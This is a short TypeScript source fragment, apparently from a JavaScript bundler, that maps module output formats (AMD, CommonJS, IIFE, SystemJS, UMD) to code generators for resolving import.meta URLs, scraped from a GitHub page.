const importMetaMechanisms: Record< string, (property: string | null, options: { chunkId: string; snippets: GenerateCodeSnippets }) => string> = { amd: getGenericImportMetaMechanism(() => getResolveUrl(`module.uri, document.baseURI`)), cjs: getGenericImportMetaMechanism( chunkId => `(typeof document === 'undefined' ? ${getFileUrlFromFullPath( '\_\_filename' )} : ${getUrlFromDocument(chunkId)})` ), iife: getGenericImportMetaMechanism(chunkId => getUrlFromDocument(chunkId)), system: (property, { snippets: { getPropertyAccess } }) => property === null ? `module.meta` : `module.meta${getPropertyAccess(property)}`, umd: getGenericImportMetaMechanism( chunkId => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromFullPath( '\_\_filename' )} : ${getUrlFromDocument(chunkId, true)})` )};

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


